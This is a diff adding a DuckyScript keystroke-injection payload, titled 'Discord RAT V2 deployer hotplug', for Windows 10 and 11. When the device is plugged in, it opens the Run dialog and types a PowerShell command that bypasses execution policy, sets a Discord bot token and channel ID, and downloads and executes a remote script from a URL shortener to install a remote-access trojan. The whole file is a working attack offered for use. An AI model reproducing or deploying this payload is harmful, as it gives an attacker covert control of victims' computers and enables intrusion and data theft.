@@ -1,0 +1,19 @@
+REM Title: Discord RAT V2 deployer hotplug
+REM Description: Deploys my Discord RAT V2 extra fast, but less stealthy...
+REM Author: simen64
+REM Target: Windows 10 or 11
+
+REM Change to your keyboard layout
+DUCKY_LANG NO
+
+REM define your constants here
+DEFINE #dc your discord token here
+DEFINE #ch Your discord channel id here
+
+DELAY 800
+CAPSLOCK_DISABLE
+
+GUI r
+DELAY 200
+STRINGLN powershell -NonI -NoP -Ep bypass -c "$tk = '#dc'; $id = '#ch'; irm https://shorturl.at/nwDFY | iex"
+CAPSLOCK
